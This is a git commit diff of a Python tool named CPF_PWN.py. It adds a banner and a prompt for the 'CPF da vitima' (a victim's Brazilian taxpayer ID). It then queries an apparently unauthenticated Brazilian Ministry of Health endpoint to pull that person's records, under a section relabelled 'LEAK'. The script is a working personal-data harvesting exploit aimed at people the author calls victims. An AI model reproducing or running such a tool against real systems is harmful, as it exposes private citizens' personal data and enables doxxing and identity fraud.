a637945c5bcbb3f83d05bf89a58e7838ae4fb1e7
Jonatas Fil <ctfninj4@gmail.com>
2016-12-04 23:54:44 -0200

    Update CPF_PWN.py

--- CPF_PWN.py
+++ CPF_PWN.py
@@ -5,7 +5,7 @@
  
 __author__ =  "Jonatas Fil a.k.a DKR and D3m0l1d0r"
 
-import requests,json,sys
+import requests,json,sys,os,commands
 
 
 # Colors
@@ -22,12 +22,25 @@ END = '\033[0m'
 RESET='\033[1;00m'
 
 
+# BANNER
+
+print """\033[91m
+
+   ___   ___   ___   _____      ___  _ 
+  / __| | _ \ | __| | _ \ \    / / \| |
+ | (__  |  _/ | _|  |  _/\ \/\/ /| .` |
+  \___| |_|   |_|   |_|   \_/\_/ |_|\_|
+
+\033[0m"""
+
+cpf = raw_input('\033[93mCPF da vitima: \033[93m')
+
 # API
-req = requests.get("http://dabsistemas.saude.gov.br/sistemas/sadab/js/buscar_cpf_dbpessoa.json.php?cpf="+str(sys.argv[1]))
+req = requests.get("http://dabsistemas.saude.gov.br/sistemas/sadab/js/buscar_cpf_dbpessoa.json.php?cpf="+str(cpf))
 dados = json.loads(req.content)
 
 
-# MENU
+# LEAK
 
 print """\033[91m
 
